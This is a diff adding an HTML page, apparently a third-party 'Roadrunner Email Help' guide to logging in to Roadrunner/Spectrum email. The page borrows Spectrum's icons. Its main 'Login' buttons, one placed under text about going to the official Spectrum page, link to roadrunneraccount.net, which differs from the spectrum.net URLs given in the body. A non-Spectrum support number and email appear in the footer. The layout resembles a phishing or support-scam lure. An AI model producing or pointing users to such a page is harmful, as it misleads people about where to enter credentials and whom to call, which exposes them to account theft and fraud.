@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Step-by-step guide on how to login to Roadrunner email. Troubleshoot login issues and access your Roadrunner (Spectrum) email from any device.">
+    <meta name="keywords" content="Roadrunner email login, RR email sign in, Spectrum webmail, access Roadrunner email, TWC email login">
+    
+    <!-- Search Engine Verification -->
+    <meta name="google-site-verification" content="lU6MgVAmLQXn6EdigLoRQJ7jv9PkygMrLRQtjbuk5xQ" />
+    <meta name="msvalidate.01" content="649552A7F8FC8C674CD07172F20F2D02" />
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://www.spectrum.net/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.spectrum.net/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://www.spectrum.net/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://www.spectrum.net/favicon-16x16.png">
+    
+    <title>How Do I Login to Roadrunner Email - Complete 2024 Guide</title>
+    <style>
+        :root {
+            --primary: #5e35b1;
+            --secondary: #3949ab;
+            --accent: #7c4dff;
+            --light: #f5f5f5;
+            --dark: #212121;
+            --success: #43a047;
+            --warning: #ff9800;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--dark);
+            background-color: #f9f9f9;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+        
+        .logo img {
+            height: 40px;
+        }
+        
+        .logo-text {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+        }
+        
+        nav ul li {
+            margin-left: 25px;
+        }
+        
+        nav ul li a {
+            text-decoration: none;
+            color: var(--dark);
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        
+        nav ul li a:hover {
+            color: var(--primary);
+        }
+        
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 80px 0;
+            text-align: center;
+        }
+        
+        .hero h1 {
+            font-size: 2.8rem;
+            margin-bottom: 15px;
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            opacity: 0.9;
+        }
+        
+        /* Main Content */
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 300px;
+            gap: 30px;
+            margin: 40px 0;
+        }
+        
+        article {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        
+        h2 {
+            color: var(--primary);
+            margin-top: 0;
+            border-bottom: 2px solid var(--light);
+            padding-bottom: 10px;
+        }
+        
+        .step {
+            margin-bottom: 25px;
+            padding-bottom: 25px;
+            border-bottom: 1px dashed #eee;
+        }
+        
+        .step-number {
+            display: inline-block;
+            background: var(--accent);
+            color: white;
+            width: 30px;
+            height: 30px;
+            text-align: center;
+            line-height: 30px;
+            border-radius: 50%;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            align-self: start;
+            position: sticky;
+            top: 100px;
+        }
+        
+        .sidebar h3 {
+            margin-top: 0;
+            color: var(--secondary);
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--light);
+        }
+        
+        .quick-links {
+            list-style: none;
+        }
+        
+        .quick-links li {
+            margin-bottom: 10px;
+        }
+        
+        .quick-links a {
+            color: var(--dark);
+            text-decoration: none;
+            display: block;
+            padding: 8px 10px;
+            border-radius: 4px;
+            transition: all 0.3s;
+        }
+        
+        .quick-links a:hover {
+            background: var(--light);
+            color: var(--primary);
+            padding-left: 15px;
+        }
+        
+        /* Login Box */
+        .login-box {
+            background: var(--light);
+            padding: 25px;
+            border-radius: 8px;
+            margin: 30px 0;
+            border-left: 4px solid var(--accent);
+            text-align: center;
+        }
+        
+        /* Buttons */
+        .btn {
+            display: inline-block;
+            background: var(--primary);
+            color: white;
+            padding: 12px 25px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+        
+        .btn:hover {
+            background: var(--secondary);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .btn-login {
+            background: var(--success);
+        }
+        
+        .btn-login:hover {
+            background: #2e7d32;
+        }
+        
+        .btn-large {
+            padding: 15px 30px;
+            font-size: 1.1rem;
+        }
+        
+        /* Troubleshooting */
+        .troubleshooting {
+            background: #fff8e1;
+            padding: 25px;
+            border-radius: 8px;
+            margin: 30px 0;
+            border-left: 4px solid var(--warning);
+        }
+        
+        .troubleshooting h3 {
+            margin-top: 0;
+            color: #ff8f00;
+        }
+        
+        /* Footer */
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 50px 0 30px;
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .footer-column h3 {
+            color: white;
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+        }
+        
+        .footer-links {
+            list-style: none;
+        }
+        
+        .footer-links li {
+            margin-bottom: 10px;
+        }
+        
+        .footer-links a {
+            color: #bdbdbd;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: white;
+        }
+        
+        .copyright {
+            text-align: center;
+            padding-top: 30px;
+            border-top: 1px solid #424242;
+            color: #bdbdbd;
+            font-size: 0.9rem;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            nav ul {
+                margin-top: 20px;
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            nav ul li {
+                margin: 10px 0;
+            }
+            
+            .mobile-menu-btn {
+                display: block;
+            }
+            
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Start of Zendesk Widget script -->
+    <script id="ze-snippet" src="https://static.zdassets.com/ekr/snippet.js?key=7668c976-0fb7-47ee-8740-3e9115bdb10f"> </script>
+    <!-- End of Zendesk Widget script -->
+    
+    <!-- Header -->
+    <header>
+        <div class="container header-container">
+            <a href="#" class="logo">
+                <img src="https://media.istockphoto.com/id/1474482824/vector/modern-road-running-symbol-vector-illustration.jpg?s=612x612&w=0&k=20&c=LYfhDTKHGt0WH97duS8qqwS1sZmpzVSWhqlS8PiB9U4=" alt="Roadrunner Email Help">
+                <span class="logo-text">Roadrunner Email Help</span>
+            </a>
+            
+            <button class="mobile-menu-btn">☰</button>
+            
+            <nav>
+                <ul>
+                    <li><a href="#">Home</a></li>
+                    <li><a href="#guide">Login Guide</a></li>
+                    <li><a href="#troubleshooting">Troubleshooting</a></li>
+                    <li><a href="#mobile">Mobile Access</a></li>
+                    <li><a href="https://roadrunneraccount.net" class="btn btn-login">Login</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <h1>How Do I Login to Roadrunner Email?</h1>
+            <p>Your complete guide to accessing Roadrunner (now Spectrum) email on all devices with step-by-step instructions and troubleshooting tips.</p>
+            <a href="https://roadrunneraccount.net" class="btn btn-login btn-large">Login to Roadrunner Email Now</a>
+        </div>
+    </section>
+    
+    <!-- Main Content -->
+    <div class="container">
+        <div class="main-content">
+            <article id="guide">
+                <h2>Complete Roadrunner Email Login Guide</h2>
+                <p>Roadrunner email (now Spectrum email) remains a popular choice for many users. This comprehensive guide will walk you through the login process on all devices, troubleshoot common issues, and provide helpful tips for managing your account.</p>
+                
+                <div class="login-box">
+                    <h3>Quick Login Access</h3>
+                    <p>To immediately access your Roadrunner email account:</p>
+                    <ol>
+                        <li>Go to the official Spectrum login page</li>
+                        <li>Enter your full Roadrunner email address</li>
+                        <li>Type your password</li>
+                        <li>Click "Sign In"</li>
+                    </ol>
+                    <a href="https://roadrunneraccount.net" class="btn btn-login" target="_blank">Go to Login Page</a>
+                </div>
+                
+                <div class="step">
+                    <h3><span class="step-number">1</span> Navigate to the Official Login Page</h3>
+                    <p>Since Roadrunner email is now part of Spectrum, you'll need to use their login portal:</p>
+                    <ul>
+                        <li>Primary login URL: <strong>https://www.spectrum.net/login</strong></li>
+                        <li>Alternative URL: <strong>https://webmail.spectrum.net</strong></li>
+                    </ul>
+                    <p>Bookmark this page for future access to avoid phishing sites.</p>
+                </div>
+                
+                <div class="step">
+                    <h3><span class="step-number">2</span> Enter Your Login Credentials</h3>
+                    <p>On the Spectrum login page:</p>
+                    <ul>
+                        <li>For email address: Enter your <strong>full Roadrunner email</strong> (username@rr.com or yourdomain.rr.com)</li>
+                        <li>For password: Enter the password you set up for your account</li>
+                        <li>Check "Remember me" if you're on a personal device (not recommended for public computers)</li>
+                    </ul>
+                </div>
+                
+                <div class="step">
+                    <h3><span class="step-number">3</span> Access Your Email Dashboard</h3>
+                    <p>After successful login, you'll be redirected to your email dashboard where you can:</p>
+                    <ul>
+                        <li>View and manage your inbox</li>
+                        <li>Compose new emails</li>
+                        <li>Access your contacts</li>
+                        <li>Manage email settings and folders</li>
+                    </ul>
+                </div>
+                
+                <div class="troubleshooting" id="troubleshooting">
+                    <h3>Common Roadrunner Email Login Issues and Solutions</h3>
+                    <p>If you're having trouble accessing your account, try these solutions:</p>
+                    <ul>
+                        <li><strong>Forgotten password:</strong> Use the "Forgot Password?" link on the login page to reset it</li>
+                        <li><strong>Account locked:</strong> After multiple failed attempts, wait 30 minutes or contact Spectrum support</li>
+                        <li><strong>Wrong domain:</strong> Ensure you're using @rr.com or your specific Roadrunner domain</li>
+                        <li><strong>Browser issues:</strong> Clear cache/cookies or try a different browser</li>
+                        <li><strong>CAPS LOCK on:</strong> Check if your password is case-sensitive</li>
+                    </ul>
+                </div>
+                
+                <h2 id="mobile">Accessing Roadrunner Email on Mobile Devices</h2>
+                <p>You can access your Roadrunner email on smartphones and tablets through:</p>
+                
+                <h3>Mobile Browser Access</h3>
+                <ol>
+                    <li>Open your mobile browser (Chrome, Safari, etc.)</li>
+                    <li>Navigate to <strong>https://www.spectrum.net/login</strong></li>
+                    <li>Enter your credentials as described above</li>
+                </ol>
+                
+                <h3>Email App Configuration</h3>
+                <p>To set up Roadrunner email on your mobile email app:</p>
+                <ul>
+                    <li><strong>Incoming Mail Server:</strong> mail.twc.com (or your regional server)</li>
+                    <li><strong>Port:</strong> 993 (IMAP) or 995 (POP3)</li>
+                    <li><strong>SSL:</strong> Enabled</li>
+                    <li><strong>Outgoing Mail Server (SMTP):</strong> mail.twc.com</li>
+                    <li><strong>Port:</strong> 465 or 587</li>
+                    <li><strong>Authentication:</strong> Required</li>
+                </ul>
+                
+                <h2>Roadrunner Email Security Tips</h2>
+                <ul>
+                    <li>Change your password regularly (every 3-6 months)</li>
+                    <li>Use a strong, unique password not used for other accounts</li>
+                    <li>Enable two-factor authentication if available</li>
+                    <li>Watch for phishing emails pretending to be from Spectrum</li>
+                    <li>Log out after each session on shared computers</li>
+                </ul>
+            </article>
+            
+            <aside class="sidebar">
+                <h3>Quick Links</h3>
+                <ul class="quick-links">
+                    <li><a href="https://www.spectrum.net/login" target="_blank">Roadrunner Email Login</a></li>
+                    <li><a href="https://www.spectrum.net/support/email" target="_blank">Spectrum Email Support</a></li>
+                    <li><a href="https://www.spectrum.net/password/reset" target="_blank">Reset Password</a></li>
+                    <li><a href="https://www.spectrum.net/contact-us" target="_blank">Contact Customer Service</a></li>
+                </ul>
+                
+                <h3>Related Guides</h3>
+                <ul class="quick-links">
+                    <li><a href="#">How to Set Up Roadrunner Email on iPhone</a></li>
+                    <li><a href="#">Fixing Roadrunner Email Not Working Issues</a></li>
+                    <li><a href="#">Transferring Roadrunner Email to Gmail</a></li>
+                    <li><a href="#">Spectrum vs Roadrunner Email Features</a></li>
+                </ul>
+                
+                <div style="margin-top: 30px; background: #e3f2fd; padding: 20px; border-radius: 8px;">
+                    <h3 style="margin-top: 0;">Need Immediate Help?</h3>
+                    <p>Spectrum customer support is available 24/7 for Roadrunner email issues:</p>
+                    <p><strong>Live Chat:</strong> Available on Spectrum.net</p>
+                    <p><strong>Twitter:</strong> @Ask_Spectrum</p>
+                </div>
+            </aside>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h3>Roadrunner Email Help</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Home</a></li>
+                        <li><a href="#guide">Login Guide</a></li>
+                        <li><a href="#troubleshooting">Troubleshooting</a></li>
+                        <li><a href="#mobile">Mobile Access</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Resources</h3>
+                    <ul class="footer-links">
+                        <li><a href="https://www.spectrum.net" target="_blank">Spectrum Official Site</a></li>
+                        <li><a href="https://www.spectrum.net/support" target="_blank">Spectrum Support</a></li>
+                        <li><a href="https://www.spectrum.net/terms" target="_blank">Terms of Service</a></li>
+                        <li><a href="https://www.spectrum.net/privacy" target="_blank">Privacy Policy</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Contact</h3>
+                    <ul class="footer-links">
+                        <li><a href="mailto:help@roadrunneremailhelp.com">Email Us</a></li>
+                        <li><a href="tel:+18557077328">Call Support</a></li>
+                        <li><a href="#">Live Chat</a></li>
+                        <li><a href="#">Feedback</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                <p>&copy; 2024 Roadrunner Email Help Center. This is an independent guide not affiliated with Spectrum or Charter Communications.</p>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
